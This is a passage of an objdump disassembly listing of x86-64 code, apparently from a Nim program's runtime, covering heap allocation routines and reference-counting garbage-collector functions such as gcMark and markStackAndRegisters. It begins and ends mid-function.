  4028ef:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
  4028f6:	00 
  4028f7:	7d 3f                	jge    402938 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x18e>
  4028f9:	eb 2f                	jmp    40292a <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x180>
  4028fb:	49 81 f9 ff ff 07 00 	cmp    $0x7ffff,%r9
  402902:	7e 16                	jle    40291a <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x170>
  402904:	48 89 fa             	mov    %rdi,%rdx
  402907:	48 89 d9             	mov    %rbx,%rcx
  40290a:	e8 d6 fc ff ff       	call   4025e5 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2>
  40290f:	48 39 78 08          	cmp    %rdi,0x8(%rax)
  402913:	48 89 c6             	mov    %rax,%rsi
  402916:	7e 20                	jle    402938 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x18e>
  402918:	eb 10                	jmp    40292a <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x180>
  40291a:	ba 00 00 08 00       	mov    $0x80000,%edx
  40291f:	48 89 d9             	mov    %rbx,%rcx
  402922:	e8 be fc ff ff       	call   4025e5 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2>
  402927:	48 89 c6             	mov    %rax,%rsi
  40292a:	49 89 f8             	mov    %rdi,%r8
  40292d:	48 89 f2             	mov    %rsi,%rdx
  402930:	48 89 d9             	mov    %rbx,%rcx
  402933:	e8 90 fc ff ff       	call   4025c8 <splitChunk__BqFVAuadgXfvAiq8B9cBjqQ>
  402938:	49 89 f0             	mov    %rsi,%r8
  40293b:	48 c7 06 01 00 00 00 	movq   $0x1,(%rsi)
  402942:	48 89 d9             	mov    %rbx,%rcx
  402945:	48 8d 93 a8 28 00 00 	lea    0x28a8(%rbx),%rdx
  40294c:	49 c1 f8 0c          	sar    $0xc,%r8
  402950:	e8 89 f8 ff ff       	call   4021de <incl__tSnfTXv7GxXoDyFDm9bvzqg>
  402955:	48 89 f0             	mov    %rsi,%rax
  402958:	48 29 bb 90 28 00 00 	sub    %rdi,0x2890(%rbx)
  40295f:	48 83 c4 20          	add    $0x20,%rsp
  402963:	5b                   	pop    %rbx
  402964:	5e                   	pop    %rsi
  402965:	5f                   	pop    %rdi
  402966:	c3                   	ret

0000000000402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>:
  402967:	55                   	push   %rbp
  402968:	57                   	push   %rdi
  402969:	56                   	push   %rsi
  40296a:	53                   	push   %rbx
  40296b:	48 83 ec 28          	sub    $0x28,%rsp
  40296f:	48 8d 72 07          	lea    0x7(%rdx),%rsi
  402973:	48 89 cb             	mov    %rcx,%rbx
  402976:	48 89 f5             	mov    %rsi,%rbp
  402979:	48 83 e5 f8          	and    $0xfffffffffffffff8,%rbp
  40297d:	48 81 fd c8 0f 00 00 	cmp    $0xfc8,%rbp
  402984:	7e 21                	jle    4029a7 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x40>
  402986:	48 8d 72 20          	lea    0x20(%rdx),%rsi
  40298a:	48 81 fe 00 00 00 3f 	cmp    $0x3f000000,%rsi
  402991:	0f 8f eb 00 00 00    	jg     402a82 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x11b>
  402997:	48 89 f2             	mov    %rsi,%rdx
  40299a:	e8 0b fe ff ff       	call   4027aa <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ>
  40299f:	48 89 c5             	mov    %rax,%rbp
  4029a2:	e9 1e 01 00 00       	jmp    402ac5 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x15e>
  4029a7:	48 83 e6 f8          	and    $0xfffffffffffffff8,%rsi
  4029ab:	48 01 ce             	add    %rcx,%rsi
  4029ae:	48 8b 46 10          	mov    0x10(%rsi),%rax
  4029b2:	48 85 c0             	test   %rax,%rax
  4029b5:	74 12                	je     4029c9 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x62>
  4029b7:	48 8b 78 20          	mov    0x20(%rax),%rdi
  4029bb:	48 85 ff             	test   %rdi,%rdi
  4029be:	74 5a                	je     402a1a <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xb3>
  4029c0:	48 8b 17             	mov    (%rdi),%rdx
  4029c3:	48 89 50 20          	mov    %rdx,0x20(%rax)
  4029c7:	eb 61                	jmp    402a2a <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xc3>
  4029c9:	ba 00 10 00 00       	mov    $0x1000,%edx
  4029ce:	e8 d7 fd ff ff       	call   4027aa <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ>
  4029d3:	ba c8 0f 00 00       	mov    $0xfc8,%edx
  4029d8:	48 29 ea             	sub    %rbp,%rdx
  4029db:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
  4029e2:	00 
  4029e3:	48 89 50 28          	mov    %rdx,0x28(%rax)
  4029e7:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  4029ee:	00 
  4029ef:	48 8b 56 10          	mov    0x10(%rsi),%rdx
  4029f3:	48 c7 40 20 00 00 00 	movq   $0x0,0x20(%rax)
  4029fa:	00 
  4029fb:	48 89 68 08          	mov    %rbp,0x8(%rax)
  4029ff:	48 89 68 30          	mov    %rbp,0x30(%rax)
  402a03:	48 85 d2             	test   %rdx,%rdx
  402a06:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402a0a:	74 04                	je     402a10 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xa9>
  402a0c:	48 89 42 18          	mov    %rax,0x18(%rdx)
  402a10:	48 89 46 10          	mov    %rax,0x10(%rsi)
  402a14:	48 8d 78 38          	lea    0x38(%rax),%rdi
  402a18:	eb 14                	jmp    402a2e <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xc7>
  402a1a:	48 8b 50 30          	mov    0x30(%rax),%rdx
  402a1e:	48 8d 7c 10 38       	lea    0x38(%rax,%rdx,1),%rdi
  402a23:	48 01 ea             	add    %rbp,%rdx
  402a26:	48 89 50 30          	mov    %rdx,0x30(%rax)
  402a2a:	48 29 68 28          	sub    %rbp,0x28(%rax)
  402a2e:	48 39 68 28          	cmp    %rbp,0x28(%rax)
  402a32:	7d 42                	jge    402a76 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x10f>
  402a34:	48 3b 46 10          	cmp    0x10(%rsi),%rax
  402a38:	48 8b 50 10          	mov    0x10(%rax),%rdx
  402a3c:	74 17                	je     402a55 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xee>
  402a3e:	48 8b 48 18          	mov    0x18(%rax),%rcx
  402a42:	48 89 51 10          	mov    %rdx,0x10(%rcx)
  402a46:	48 8b 50 10          	mov    0x10(%rax),%rdx
  402a4a:	48 85 d2             	test   %rdx,%rdx
  402a4d:	74 17                	je     402a66 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xff>
  402a4f:	48 89 4a 18          	mov    %rcx,0x18(%rdx)
  402a53:	eb 11                	jmp    402a66 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xff>
  402a55:	48 85 d2             	test   %rdx,%rdx
  402a58:	48 89 56 10          	mov    %rdx,0x10(%rsi)
  402a5c:	74 08                	je     402a66 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xff>
  402a5e:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
  402a65:	00 
  402a66:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
  402a6d:	00 
  402a6e:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  402a75:	00 
  402a76:	48 01 ab 98 28 00 00 	add    %rbp,0x2898(%rbx)
  402a7d:	e9 98 00 00 00       	jmp    402b1a <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x1b3>
  402a82:	48 89 f1             	mov    %rsi,%rcx
  402a85:	e8 f8 f5 ff ff       	call   402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>
  402a8a:	48 8d 93 a8 28 00 00 	lea    0x28a8(%rbx),%rdx
  402a91:	48 89 d9             	mov    %rbx,%rcx
  402a94:	48 01 b3 80 28 00 00 	add    %rsi,0x2880(%rbx)
  402a9b:	49 89 c0             	mov    %rax,%r8
  402a9e:	48 89 70 08          	mov    %rsi,0x8(%rax)
  402aa2:	48 89 c5             	mov    %rax,%rbp
  402aa5:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
  402aac:	00 
  402aad:	49 c1 f8 0c          	sar    $0xc,%r8
  402ab1:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  402ab8:	00 
  402ab9:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
  402ac0:	e8 19 f7 ff ff       	call   4021de <incl__tSnfTXv7GxXoDyFDm9bvzqg>
  402ac5:	48 83 bb a8 30 00 00 	cmpq   $0x0,0x30a8(%rbx)
  402acc:	00 
  402acd:	48 8d 7d 20          	lea    0x20(%rbp),%rdi
  402ad1:	75 26                	jne    402af9 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x192>
  402ad3:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  402ada:	00 
  402adb:	48 8d 83 d8 30 00 00 	lea    0x30d8(%rbx),%rax
  402ae2:	75 0e                	jne    402af2 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x18b>
  402ae4:	48 89 83 d8 30 00 00 	mov    %rax,0x30d8(%rbx)
  402aeb:	48 89 83 e0 30 00 00 	mov    %rax,0x30e0(%rbx)
  402af2:	48 89 83 a8 30 00 00 	mov    %rax,0x30a8(%rbx)
  402af9:	48 8d 93 a8 30 00 00 	lea    0x30a8(%rbx),%rdx
  402b00:	49 89 f8             	mov    %rdi,%r8
  402b03:	48 89 d9             	mov    %rbx,%rcx
  402b06:	4c 8d 0c 37          	lea    (%rdi,%rsi,1),%r9
  402b0a:	e8 1b f6 ff ff       	call   40212a <add__3D9aOyz4rDquPZKBlqn0xig>
  402b0f:	48 8b 45 08          	mov    0x8(%rbp),%rax
  402b13:	48 01 83 98 28 00 00 	add    %rax,0x2898(%rbx)
  402b1a:	48 89 f8             	mov    %rdi,%rax
  402b1d:	48 83 c4 28          	add    $0x28,%rsp
  402b21:	5b                   	pop    %rbx
  402b22:	5e                   	pop    %rsi
  402b23:	5f                   	pop    %rdi
  402b24:	5d                   	pop    %rbp
  402b25:	c3                   	ret

0000000000402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>:
  402b26:	48 83 ec 28          	sub    $0x28,%rsp
  402b2a:	48 83 c2 10          	add    $0x10,%rdx
  402b2e:	e8 34 fe ff ff       	call   402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>
  402b33:	48 c7 40 08 01 00 00 	movq   $0x1,0x8(%rax)
  402b3a:	00 
  402b3b:	48 83 c0 10          	add    $0x10,%rax
  402b3f:	48 83 c4 28          	add    $0x28,%rsp
  402b43:	c3                   	ret

0000000000402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>:
  402b44:	41 54                	push   %r12
  402b46:	55                   	push   %rbp
  402b47:	57                   	push   %rdi
  402b48:	56                   	push   %rsi
  402b49:	53                   	push   %rbx
  402b4a:	48 83 ec 20          	sub    $0x20,%rsp
  402b4e:	48 8b 41 08          	mov    0x8(%rcx),%rax
  402b52:	48 3b 01             	cmp    (%rcx),%rax
  402b55:	48 89 cb             	mov    %rcx,%rbx
  402b58:	49 89 d4             	mov    %rdx,%r12
  402b5b:	7f 52                	jg     402baf <add__W9aRfhn7HvnQTPAb8ajo1uwsystem+0x6b>
  402b5d:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  402b61:	b9 02 00 00 00       	mov    $0x2,%ecx
  402b66:	48 99                	cqto
  402b68:	48 f7 f9             	idiv   %rcx
  402b6b:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402b6f:	48 89 c6             	mov    %rax,%rsi
  402b72:	e8 29 f1 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  402b77:	48 8d 14 f5 00 00 00 	lea    0x0(,%rsi,8),%rdx
  402b7e:	00 
  402b7f:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  402b86:	e8 9b ff ff ff       	call   402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>
  402b8b:	48 8b 73 10          	mov    0x10(%rbx),%rsi
  402b8f:	48 89 c5             	mov    %rax,%rbp
  402b92:	48 8b 03             	mov    (%rbx),%rax
  402b95:	48 89 ef             	mov    %rbp,%rdi
  402b98:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
  402b9f:	00 
  402ba0:	f3 a4                	rep movsb (%rsi),(%rdi)
  402ba2:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
  402ba6:	e8 fb f9 ff ff       	call   4025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>
  402bab:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
  402baf:	48 8b 03             	mov    (%rbx),%rax
  402bb2:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  402bb6:	4c 89 24 c2          	mov    %r12,(%rdx,%rax,8)
  402bba:	48 ff c0             	inc    %rax
  402bbd:	48 89 03             	mov    %rax,(%rbx)
  402bc0:	48 83 c4 20          	add    $0x20,%rsp
  402bc4:	5b                   	pop    %rbx
  402bc5:	5e                   	pop    %rsi
  402bc6:	5f                   	pop    %rdi
  402bc7:	5d                   	pop    %rbp
  402bc8:	41 5c                	pop    %r12
  402bca:	c3                   	ret

0000000000402bcb <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47>:
  402bcb:	4c 8b 42 28          	mov    0x28(%rdx),%r8
  402bcf:	48 89 c8             	mov    %rcx,%rax
  402bd2:	48 8b 4a 18          	mov    0x18(%rdx),%rcx
  402bd6:	4c 8d 0c cd 00 00 00 	lea    0x0(,%rcx,8),%r9
  402bdd:	00 
  402bde:	48 83 f9 08          	cmp    $0x8,%rcx
  402be2:	7f 10                	jg     402bf4 <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0x29>
  402be4:	49 89 04 c8          	mov    %rax,(%r8,%rcx,8)
  402be8:	48 ff c1             	inc    %rcx
  402beb:	48 89 4a 18          	mov    %rcx,0x18(%rdx)
  402bef:	e9 ae 00 00 00       	jmp    402ca2 <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xd7>
  402bf4:	4f 8d 54 08 f8       	lea    -0x8(%r8,%r9,1),%r10
  402bf9:	4d 8b 1a             	mov    (%r10),%r11
  402bfc:	49 8b 0b             	mov    (%r11),%rcx
  402bff:	48 83 f9 07          	cmp    $0x7,%rcx
  402c03:	0f 87 83 00 00 00    	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xc1>
  402c09:	4f 8d 54 08 f0       	lea    -0x10(%r8,%r9,1),%r10
  402c0e:	4d 8b 1a             	mov    (%r10),%r11
  402c11:	49 8b 0b             	mov    (%r11),%rcx
  402c14:	48 83 f9 07          	cmp    $0x7,%rcx
  402c18:	77 72                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xc1>
  402c1a:	4f 8d 54 08 e8       	lea    -0x18(%r8,%r9,1),%r10
  402c1f:	4d 8b 1a             	mov    (%r10),%r11
  402c22:	49 8b 0b             	mov    (%r11),%rcx
  402c25:	48 83 f9 07          	cmp    $0x7,%rcx
  402c29:	77 61                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xc1>
  402c2b:	4f 8d 54 08 e0       	lea    -0x20(%r8,%r9,1),%r10
  402c30:	4d 8b 1a             	mov    (%r10),%r11
  402c33:	49 8b 0b             	mov    (%r11),%rcx
  402c36:	48 83 f9 07          	cmp    $0x7,%rcx
  402c3a:	77 50                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xc1>
  402c3c:	4f 8d 54 08 d8       	lea    -0x28(%r8,%r9,1),%r10
  402c41:	4d 8b 1a             	mov    (%r10),%r11
  402c44:	49 8b 0b             	mov    (%r11),%rcx
  402c47:	48 83 f9 07          	cmp    $0x7,%rcx
  402c4b:	77 3f                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xc1>
  402c4d:	4f 8d 54 08 d0       	lea    -0x30(%r8,%r9,1),%r10
  402c52:	4d 8b 1a             	mov    (%r10),%r11
  402c55:	49 8b 0b             	mov    (%r11),%rcx
  402c58:	48 83 f9 07          	cmp    $0x7,%rcx
  402c5c:	77 2e                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xc1>
  402c5e:	4f 8d 54 08 c8       	lea    -0x38(%r8,%r9,1),%r10
  402c63:	4d 8b 1a             	mov    (%r10),%r11
  402c66:	49 8b 0b             	mov    (%r11),%rcx
  402c69:	48 83 f9 07          	cmp    $0x7,%rcx
  402c6d:	77 1d                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xc1>
  402c6f:	4f 8d 44 08 c0       	lea    -0x40(%r8,%r9,1),%r8
  402c74:	4d 8b 08             	mov    (%r8),%r9
  402c77:	49 8b 09             	mov    (%r9),%rcx
  402c7a:	48 83 f9 07          	cmp    $0x7,%rcx
  402c7e:	77 18                	ja     402c98 <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xcd>
  402c80:	48 8d 4a 18          	lea    0x18(%rdx),%rcx
  402c84:	48 89 c2             	mov    %rax,%rdx
  402c87:	e9 b8 fe ff ff       	jmp    402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>
  402c8c:	48 83 e1 fb          	and    $0xfffffffffffffffb,%rcx
  402c90:	49 89 0b             	mov    %rcx,(%r11)
  402c93:	49 89 02             	mov    %rax,(%r10)
  402c96:	eb 0a                	jmp    402ca2 <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47+0xd7>
  402c98:	48 83 e1 fb          	and    $0xfffffffffffffffb,%rcx
  402c9c:	49 89 09             	mov    %rcx,(%r9)
  402c9f:	49 89 00             	mov    %rax,(%r8)
  402ca2:	c3                   	ret

0000000000402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>:
  402ca3:	48 83 ec 28          	sub    $0x28,%rsp
  402ca7:	4c 8d 4a f0          	lea    -0x10(%rdx),%r9
  402cab:	49 89 ca             	mov    %rcx,%r10
  402cae:	49 81 f9 00 10 00 00 	cmp    $0x1000,%r9
  402cb5:	0f 86 bd 00 00 00    	jbe    402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402cbb:	48 8d 89 10 29 00 00 	lea    0x2910(%rcx),%rcx
  402cc2:	4c 89 ca             	mov    %r9,%rdx
  402cc5:	48 c1 fa 0c          	sar    $0xc,%rdx
  402cc9:	e8 04 ec ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  402cce:	84 c0                	test   %al,%al
  402cd0:	75 0b                	jne    402cdd <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0x3a>
  402cd2:	4d 3b 4a 68          	cmp    0x68(%r10),%r9
  402cd6:	73 58                	jae    402d30 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0x8d>
  402cd8:	e9 9b 00 00 00       	jmp    402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402cdd:	4c 89 c9             	mov    %r9,%rcx
  402ce0:	48 81 e1 00 f0 ff ff 	and    $0xfffffffffffff000,%rcx
  402ce7:	f6 01 01             	testb  $0x1,(%rcx)
  402cea:	0f 84 88 00 00 00    	je     402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402cf0:	4c 8b 59 08          	mov    0x8(%rcx),%r11
  402cf4:	49 81 fb c8 0f 00 00 	cmp    $0xfc8,%r11
  402cfb:	7e 10                	jle    402d0d <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0x6a>
  402cfd:	48 8d 51 20          	lea    0x20(%rcx),%rdx
  402d01:	4c 39 ca             	cmp    %r9,%rdx
  402d04:	77 72                	ja     402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d06:	48 83 79 28 01       	cmpq   $0x1,0x28(%rcx)
  402d0b:	eb 58                	jmp    402d65 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xc2>
  402d0d:	41 81 e1 ff 0f 00 00 	and    $0xfff,%r9d
  402d14:	49 8d 41 c8          	lea    -0x38(%r9),%rax
  402d18:	48 3b 41 30          	cmp    0x30(%rcx),%rax
  402d1c:	73 5a                	jae    402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d1e:	4c 8d 44 01 38       	lea    0x38(%rcx,%rax,1),%r8
  402d23:	31 d2                	xor    %edx,%edx
  402d25:	49 f7 f3             	div    %r11
  402d28:	49 29 d0             	sub    %rdx,%r8
  402d2b:	4c 89 c2             	mov    %r8,%rdx
  402d2e:	eb 30                	jmp    402d60 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xbd>
  402d30:	4d 3b 4a 70          	cmp    0x70(%r10),%r9
  402d34:	77 42                	ja     402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d36:	49 8b 82 10 31 00 00 	mov    0x3110(%r10),%rax
  402d3d:	48 3b 00             	cmp    (%rax),%rax
  402d40:	74 36                	je     402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d42:	48 8b 50 10          	mov    0x10(%rax),%rdx
  402d46:	49 39 d1             	cmp    %rdx,%r9
  402d49:	72 06                	jb     402d51 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xae>
  402d4b:	4c 3b 48 18          	cmp    0x18(%rax),%r9
  402d4f:	72 0f                	jb     402d60 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xbd>
  402d51:	49 39 d1             	cmp    %rdx,%r9
  402d54:	0f 97 c2             	seta   %dl
  402d57:	0f b6 d2             	movzbl %dl,%edx
  402d5a:	48 8b 04 d0          	mov    (%rax,%rdx,8),%rax
  402d5e:	eb dd                	jmp    402d3d <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0x9a>
  402d60:	48 83 7a 08 01       	cmpq   $0x1,0x8(%rdx)
  402d65:	76 11                	jbe    402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d67:	48 83 02 08          	addq   $0x8,(%rdx)
  402d6b:	49 8d 4a 30          	lea    0x30(%r10),%rcx
  402d6f:	48 83 c4 28          	add    $0x28,%rsp
  402d73:	e9 cc fd ff ff       	jmp    402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>
  402d78:	48 83 c4 28          	add    $0x28,%rsp
  402d7c:	c3                   	ret

0000000000402d7d <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g>:
  402d7d:	55                   	push   %rbp
  402d7e:	41 54                	push   %r12
  402d80:	57                   	push   %rdi
  402d81:	56                   	push   %rsi
  402d82:	53                   	push   %rbx
  402d83:	48 89 e5             	mov    %rsp,%rbp
  402d86:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
  402d8d:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
  402d91:	48 8d 8d 00 ff ff ff 	lea    -0x100(%rbp),%rcx
  402d98:	48 89 ea             	mov    %rbp,%rdx
  402d9b:	e8 a0 56 00 00       	call   408440 <_setjmp>
  402da0:	85 c0                	test   %eax,%eax
  402da2:	0f 85 c7 00 00 00    	jne    402e6f <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0xf2>
  402da8:	48 8b 45 30          	mov    0x30(%rbp),%rax
  402dac:	48 8d 9d 00 ff ff ff 	lea    -0x100(%rbp),%rbx
  402db3:	49 89 ec             	mov    %rbp,%r12
  402db6:	48 8b 38             	mov    (%rax),%rdi
  402db9:	48 89 fe             	mov    %rdi,%rsi
  402dbc:	49 39 dc             	cmp    %rbx,%r12
  402dbf:	77 06                	ja     402dc7 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0x4a>
  402dc1:	48 83 ee 40          	sub    $0x40,%rsi
  402dc5:	eb 1f                	jmp    402de6 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0x69>
  402dc7:	48 8b 13             	mov    (%rbx),%rdx
  402dca:	48 83 c3 08          	add    $0x8,%rbx
  402dce:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402dd2:	e8 cc fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402dd7:	48 8b 53 fc          	mov    -0x4(%rbx),%rdx
  402ddb:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402ddf:	e8 bf fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402de4:	eb d6                	jmp    402dbc <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0x3f>
  402de6:	48 39 de             	cmp    %rbx,%rsi
  402de9:	76 6d                	jbe    402e58 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0xdb>
  402deb:	48 8b 13             	mov    (%rbx),%rdx
  402dee:	48 83 c3 40          	add    $0x40,%rbx
  402df2:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402df6:	e8 a8 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402dfb:	48 8b 53 c8          	mov    -0x38(%rbx),%rdx
  402dff:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e03:	e8 9b fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e08:	48 8b 53 d0          	mov    -0x30(%rbx),%rdx
  402e0c:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e10:	e8 8e fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e15:	48 8b 53 d8          	mov    -0x28(%rbx),%rdx
  402e19:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e1d:	e8 81 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e22:	48 8b 53 e0          	mov    -0x20(%rbx),%rdx
  402e26:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e2a:	e8 74 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e2f:	48 8b 53 e8          	mov    -0x18(%rbx),%rdx
  402e33:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e37:	e8 67 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e3c:	48 8b 53 f0          	mov    -0x10(%rbx),%rdx
  402e40:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e44:	e8 5a fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e49:	48 8b 53 f8          	mov    -0x8(%rbx),%rdx
  402e4d:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e51:	e8 4d fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e56:	eb 8e                	jmp    402de6 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0x69>
  402e58:	48 39 df             	cmp    %rbx,%rdi
  402e5b:	72 12                	jb     402e6f <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0xf2>
  402e5d:	48 8b 13             	mov    (%rbx),%rdx
  402e60:	48 83 c3 08          	add    $0x8,%rbx
  402e64:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e68:	e8 36 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e6d:	eb e9                	jmp    402e58 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0xdb>
  402e6f:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
  402e76:	5b                   	pop    %rbx
  402e77:	5e                   	pop    %rsi
  402e78:	5f                   	pop    %rdi
  402e79:	41 5c                	pop    %r12
  402e7b:	5d                   	pop    %rbp
  402e7c:	c3                   	ret

0000000000402e7d <addZCT__Y66tOYFjgwJ0k4aLz4bc0Q>:
  402e7d:	48 8b 02             	mov    (%rdx),%rax
  402e80:	a8 04                	test   $0x4,%al
  402e82:	75 0c                	jne    402e90 <addZCT__Y66tOYFjgwJ0k4aLz4bc0Q+0x13>
  402e84:	48 83 c8 04          	or     $0x4,%rax
  402e88:	48 89 02             	mov    %rax,(%rdx)
  402e8b:	e9 b4 fc ff ff       	jmp    402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>
  402e90:	c3                   	ret

0000000000402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.83>:
  402e91:	53                   	push   %rbx
  402e92:	48 83 ec 20          	sub    $0x20,%rsp
  402e96:	48 8b 01             	mov    (%rcx),%rax
  402e99:	48 83 e8 08          	sub    $0x8,%rax
  402e9d:	48 89 cb             	mov    %rcx,%rbx
  402ea0:	48 83 f8 07          	cmp    $0x7,%rax
  402ea4:	48 89 01             	mov    %rax,(%rcx)
  402ea7:	77 13                	ja     402ebc <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.83+0x2b>
